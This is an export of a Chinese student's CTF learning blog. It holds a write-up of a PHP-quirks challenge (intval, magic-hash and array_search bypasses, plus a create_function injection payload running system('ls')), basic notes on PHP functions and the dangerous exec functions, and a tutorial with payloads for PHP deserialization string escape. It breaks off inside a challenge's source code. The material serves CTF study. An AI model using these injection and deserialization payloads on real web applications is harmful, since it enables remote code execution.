<h1 id="了解过php特性吗"><a href="#了解过php特性吗" class="headerlink" title="了解过php特性吗"></a>了解过php特性吗</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rce.php&quot;</span>);</span><br><span class="line"><span class="variable">$checker_1</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_2</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_3</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_4</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_114</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="variable">$_514</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;514&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr4y</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arr4y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$checker_1</span> &amp;&amp; <span class="variable">$checker_2</span> &amp;&amp; <span class="variable">$checker_3</span> &amp;&amp; <span class="variable">$checker_4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rce</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看代码可以发现有四层检查<br>1.使intval函数我们直接使用数组绕过就可，intval在遇到数组时回直接返回1</p>
<p>2.我们使用md5值为0e开头的来绕过，is_num要为数字，其次我们需要将传入的值倒序，我们直接查就可以了</p>
<p>3.第一个114我们使用科学计数法绕过，传值为2e8<br>514可以使用9999999999a来绕过<br>4.我们直接给数组arr4[]随便传值只要不为nss<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$nss</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>];</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shell</span>)&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$nss</span>))&#123;</span><br><span class="line">    <span class="variable">$nss_shell</span> = <span class="title function_ invoke__">create_function</span>(<span class="variable">$shell</span>,<span class="variable">$nss</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以使用create_function注入<br>网站如下<br><a href="https://www.cnblogs.com/-chenxs/p/11459374.html">create_function注入</a><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;&#125;system(&quot;ls&quot;);/*</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>比赛wp(复现)</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>php</title>
    <url>/2023/11/08/php/</url>
    <content><![CDATA[<h1 id="在这里我会写一写关于php的笔记。"><a href="#在这里我会写一写关于php的笔记。" class="headerlink" title="在这里我会写一写关于php的笔记。"></a>在这里我会写一写关于php的笔记。</h1><h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><p><code>__FILE__</code>（返回文件的路径和名称）像这样的是魔术常量是预定义常量<br>highhigh<em>file(`<em>_FILE</em></em>`)高亮文件路径</p>
<h2 id="数据表单"><a href="#数据表单" class="headerlink" title="数据表单"></a>数据表单</h2><p>$_GET —— 接受 GET 请求传递的参数。<br>示例：example.com/index.php?book=HELLOCTF，你可以使用 $_GET[‘book’] 来获取相应的值。</p>
<p>$_POST —— 接受 POST 请求传递的参数。<br>示例：对 example.com/index.php 进行 POST 传参，参数名为 book 内容为 HelloCTF，你可以使用 $_POST[‘book’] 来获取相应的值。</p>
<p>$_REQUEST —— 接受 GET 和 POST 以及 Cookie 请求传递的参数。</p>
<p>示例：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果你通过 URL 传递了一个参数 example.com/index.php?key=value_from_get，你可以通过 `$_REQUEST[&#x27;key&#x27;]`获取这个值。</span><br><span class="line">如果你通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，你也可以通过 $_REQUEST[&#x27;key&#x27;] 获取这个值。</span><br><span class="line">同时，如果你设置了一个名为 key 的 cookie，其值为 value_from_cookie，你还是可以使用 `$_REQUEST[&#x27;key&#x27;]` 来获取这个值。</span><br></pre></td></tr></table></figure></p>
<h2 id="json-decode-与json-encode"><a href="#json-decode-与json-encode" class="headerlink" title="json_decode()与json encode()"></a>json_decode()与json encode()</h2><h3 id="json-decode-是将字符串编程数组如以下代码"><a href="#json-decode-是将字符串编程数组如以下代码" class="headerlink" title="json_decode()是将字符串编程数组如以下代码"></a>json_decode()是将字符串编程数组如以下代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$json</span>=&#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line">var_dump=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>)</span><br><span class="line">输出：</span><br><span class="line"><span class="keyword">array</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="string">&quot;a&quot;</span>]=&gt;<span class="string">&quot;1&quot;</span></span><br><span class="line">[<span class="string">&quot;b&quot;</span>]=&gt;<span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3>]]></content>
      <categories>
        <category>php</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2024/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-1/</url>
    <content><![CDATA[<h1 id="什么是php伪协议"><a href="#什么是php伪协议" class="headerlink" title="什么是php伪协议"></a>什么是php伪协议</h1>]]></content>
      <categories>
        <category>php</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>php函数</title>
    <url>/2023/11/17/php%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="我会在这里写下我在写ctf题时遇到的不会和不熟悉的的php函数"><a href="#我会在这里写下我在写ctf题时遇到的不会和不熟悉的的php函数" class="headerlink" title="我会在这里写下我在写ctf题时遇到的不会和不熟悉的的php函数"></a>我会在这里写下我在写ctf题时遇到的不会和不熟悉的的php函数</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><p>这个函数是个正则表达式，代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;查找到匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未发现匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输出：查找到匹配的字符串 php<br>上面的代码的意思为：在后式的”PHP”中查找前式列出的字符串php,有则返回1无返回0<br>/php/两边的/是用于对字符串的分隔//后的i代表这是一个对大小写不敏感的查询所有这个会返回1就是真</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* 模式中的 \b 标记一个单词边界，所以只有独立的单词&quot;web&quot;会被匹配，而不会匹配</span><br><span class="line"> * 单词的部分内容比如&quot;webbing&quot; 或 &quot;cobweb&quot; */</span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;查找到匹配的字符串。\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;未发现匹配的字符串。\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;查找到匹配的字符串。\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;未发现匹配的字符串。\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找到匹配的字符串。</span><br><span class="line">未发现匹配的字符串。</span><br></pre></td></tr></table></figure><br>在前式的字符串用/分隔字符串时可以添加\b来标记单词边界，只有独立的单词会被查询匹配</p>
<h2 id="substr-函数返回字符串的一部分。"><a href="#substr-函数返回字符串的一部分。" class="headerlink" title="substr 函数返回字符串的一部分。"></a>substr 函数返回字符串的一部分。</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">10</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">3</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">7</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">10</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">8</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">4</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br><span class="line">d</span><br><span class="line">ello world</span><br><span class="line">lo world</span><br><span class="line">orld</span><br></pre></td></tr></table></figure><br>这个函数的实质就是返回从第n个字符开始后的除第n个字符的所有字符<br>负数就是倒着数第n个开始<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,<span class="number">10</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">1</span>,<span class="number">8</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,<span class="number">5</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">6</span>,<span class="number">6</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,-<span class="number">1</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">10</span>,-<span class="number">2</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,<span class="number">0</span>,-<span class="number">6</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="string">&quot;Hello world&quot;</span>,-<span class="number">2</span>-<span class="number">3</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>返回<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br><span class="line">Hello worl</span><br><span class="line">ello wor</span><br><span class="line">Hello</span><br><span class="line">world</span><br></pre></td></tr></table></figure></p>
<h2 id="eval-assert-：将函数内的字符串当成代码执行"><a href="#eval-assert-：将函数内的字符串当成代码执行" class="headerlink" title="eval(),assert()：将函数内的字符串当成代码执行"></a>eval(),assert()：将函数内的字符串当成代码执行</h2><p>由于该函数会将函数内的字符串当成代码执行，这也就导致我们可以在这个函数里输入一些危险函数来对服务器进行操作</p>
<h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><h2 id="1-system-exec-shell-exec-passthru"><a href="#1-system-exec-shell-exec-passthru" class="headerlink" title="1.system() exec() shell_exec() passthru()"></a>1.system() exec() shell_exec() passthru()</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>该函数会执行外部程序(也就是命令)并将结果返回显示输出</p>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><p>该函数与system非常相似，不同的是该函数不会显示输出，只是返回值为命令的结果，所有如果要查看结果需要输出该函数的值，可以使用echo()或var_dump()</p>
<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><p>该函数需要在shell环境下才可以执行命令（意味着只能在linux，mac，shell环境下才可以运行）</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><p>执行外部程序并且显示原始输出</p>
]]></content>
      <categories>
        <category>php</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>php函数</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化之字符串逃逸</title>
    <url>/2024/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<h1 id="web的信息收集内容太多了学的我头疼，所以我想写一下这个php反序列化的字符串逃逸。"><a href="#web的信息收集内容太多了学的我头疼，所以我想写一下这个php反序列化的字符串逃逸。" class="headerlink" title="web的信息收集内容太多了学的我头疼，所以我想写一下这个php反序列化的字符串逃逸。"></a>web的信息收集内容太多了学的我头疼，所以我想写一下这个php反序列化的字符串逃逸。</h1><h1 id="字符增多的逃逸"><a href="#字符增多的逃逸" class="headerlink" title="字符增多的逃逸"></a>字符增多的逃逸</h1><p>字符串逃逸的成因是waf将一些敏感字符进行了一些替换导致了字符串的字符数量的增多减少。如下面的代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">black_list</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以看到上面的代码回将flag改为hacker那么这个字符数量就多了两个，那么我们思考一些，如果waf对我们传入的pop链进行字符替换那么会发生什么呢?比如我们反序列的pop链为<code>O:1:&quot;E&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;flag&quot;;&#125;</code>那么这个再经过black_list的处理后就会变为<code>O:1:&quot;E&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;hacker&quot;;&#125;</code>那么这是时候我们是无法进行反序列的，因为s的数量小于字符数。那么我们字符串逃逸是怎么造成的呢?</p>
<h2 id="字符逃逸的原理"><a href="#字符逃逸的原理" class="headerlink" title="字符逃逸的原理"></a>字符逃逸的原理</h2><p>首先我们要知道反序列的结束位置。当反序列化遇到<code>;&#125;</code>时就会停止。注意<code>;&#125;</code>是不能包含再字符串里的即像<code>s:5:&quot;lll;&#125;&quot;;&#125;</code>前一个<code>;&#125;</code>是字符串的第4,5个字符，这就导致了其无法将反序列提前结束。<br>但是如果由于waf导致字符变多或者减少这就会导致，原本应该被解析为字符的字符被解析为特殊字符，使得反序列的结果被更改。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>还是拿上面的函数来作为waf来解释</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">black_list</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="string">&#x27;hacker~&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;flag&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;lalalalala&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">E</span>());</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">black_list</span>(<span class="variable">$a</span>)</span><br></pre></td></tr></table></figure>
<p>上面的代码就存在字符逃逸字符增多的漏洞<br>我们要利用修改<code>$a</code>的值来尝试修改$b的值。<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hacker~&quot;</span>;&#125;;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;lalalalala&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到上面的的flag变成了<code>hacker~</code>正好和<code>flag&quot;;&#125;</code>的长度相同那么这就导致了hacker~被识别为了字符串而<code>&quot;;&#125;</code>被识别为了特殊字符。这就导致了反序列是遇到了<code>;&#125;</code>提前结束。这就是waf错误的将反序列的的字符增多导致了<code>&quot;;&#125;</code>逃逸出字符串被解析为反序列语句。<br>那么我们可以将<code>&quot;;&#125;</code>进行更改更改成<code>&quot;;s:1:&quot;b&quot;;s:10:&quot;hahahahaha&quot;;&#125;</code>如果这句话被逃逸就会造成反序列的结果被更改即类的属性被更改。<br>如果要使<code>&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>逃逸就要使pop链再被waf更改后的字符增多相同字符数。如<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;E&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;flagflagflagflagflagflagflagflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;hhhhahahahaha&quot;</span>;&#125;<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:10:&quot;</span>lalalalala<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><br>我们传入的<code>$a</code>值为<code>flagflagflagflagflagflagflagflag&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>传入了8个flag再经过waf后变为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;E&quot;:2:&#123;s:1:&quot;a&quot;;s:64:&quot;hacker~hacker~hacker~hacker~hacker~hacker~hacker~hacker~&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;&quot;;s:1:&quot;b&quot;;s:10:&quot;lalalalala&quot;;&#125;</span><br></pre></td></tr></table></figure><br>替换后的字符正好为64个即多出来的字符数整好为需要逃逸的字符数。导致<code>&quot;;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>逃逸这就使得<code>&quot;</code>闭合前一个引号<code>;s:1:&quot;b&quot;;s:13:&quot;hhhhahahahaha&quot;;&#125;</code>被解析为反序列化链。这就使得被解析后的b变为了hhhhhahahaha而不是lalalalalala。</p>
<h1 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h1><p>字符减少的字符逃逸其实本质原理和增多是一样的，是将本改解析为字符串的解析成了非字符串导致了反序列的结果发生改变。<br>我这里就直接放例子了<br>我们这里假设flag会被直接解析成空<br>我们观察下面的序列化语句<br><img src="/2024/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1.png" class="" title="alt text"><br>会发现如果我们可以将第一个属性的字符串减少使得第二个属性即红色的原本为序列化语句的部分被解析成字符串，那么我们原本构造的字符串就会被逃逸出去。<br>红色部分为16个字符即我们只要在第一个属性里构造一个会被waf减少16个字符的字符串即可将红色部分解析成字符串使得我们构造的绿色部分逃逸即字符串减少的逃逸与增多的在paylaod上构造的唯一区别就是一个是要增多与需要逃逸的字符串相同数量的字符，一个要减少到需要逃逸的字符串的数量的字符。</p>
<h1 id="题目prize-p5-字符增多"><a href="#题目prize-p5-字符增多" class="headerlink" title="题目prize_p5(字符增多)"></a>题目prize_p5(字符增多)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">catalogue</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">error</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">data</span> = &quot;<span class="title">hacker</span>&quot;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__destruct</span>()</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>($<span class="title">this</span>-&gt;<span class="title">data</span>);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">error</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$OTL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;OTL = <span class="variable">$OTL</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="variable language_">$this</span>-&gt;OTL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">escape</span></span>&#123;                                                                   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;OTL&#x27;</span>;                                                 </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$phone</span> = <span class="string">&#x27;123666&#x27;</span>;                                             </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$email</span> = <span class="string">&#x27;sweet@OTL.com&#x27;</span>;                          </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abscond</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span 